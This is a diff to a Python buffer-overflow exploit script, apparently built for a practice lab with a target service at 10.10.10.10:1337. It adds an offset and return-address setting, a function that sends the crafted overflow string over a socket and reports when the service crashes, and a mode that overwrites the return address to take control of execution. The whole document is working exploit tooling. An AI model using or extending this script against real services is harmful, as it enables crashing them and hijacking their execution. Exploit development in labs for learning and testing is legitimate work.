@@ -32,11 +32,15 @@ def use_local_config_file():
                 host = config.settings['host']
                 port = config.settings['port']
                 prefix = config.settings['prefix']
+                offset = config.settings['offset']
+                retn = config.settings['retn']
                 length = config.settings['length']
                 if mode == 'fuzz':
                     fuzz()
                 elif mode == 'overflow':
                     overflow(host,port,prefix,length)
+                elif mode == 'control':
+                    control(host,port,prefix,offset,retn,length)
             except Exception as err:
                 print("[x] The %s key is missing from the settings variable." % err)
         else:
@@ -51,6 +55,8 @@ def generate_config_template():
     config.write("    'host': '10.10.10.10',\n")
     config.write("    'port': 1337,\n")
     config.write("    'prefix': 'OVERFLOW1 ',\n")
+    config.write("    'offset': 1978,\n")
+    config.write("    'retn': 'BBBB',\n")
     config.write("    'length': 2400,\n")
     config.write("}\n")
     config.close()
@@ -64,6 +70,20 @@ def connect(host,port):
     client.connect(target)
     client.recv(1024)
     return client
+
+def send_bof(bof,host,port):
+    try:
+        client = connect(host,port)
+        client.send(bytes(bof + "\r\n","latin-1"))
+        client.close()
+        print("[+] Sent BOF.")
+        try:
+            client = connect(host,port)
+            client.close()
+        except:
+            print("[+] Tango down!")
+    except:
+        print("[x] Failed to connect to port %d." % port)
 
 def fuzz():
     string = prefix + "A" * 100
@@ -95,7 +115,6 @@ def overflow(host,port,prefix,length):
         exit()
     suffix = ""
     bof = prefix + overflow + retn + padding + payload + suffix
-
     try:
         client = connect(host,port)
         client.send(bytes(bof + "\r\n","latin-1"))
@@ -108,6 +127,14 @@ def overflow(host,port,prefix,length):
             print("[+] Tango down!")
     except:
         print("[x] Failed to connect to port %d." % port)
+
+def control(host,port,prefix,offset,retn,length):
+    overflow = "A" * offset
+    padding = ""
+    payload = ""
+    suffix = ""
+    bof = prefix + overflow + retn + padding + payload + suffix
+    send_bof(bof,host,port)
 
 if __name__ == "__main__":
     if args.generate_config_template:
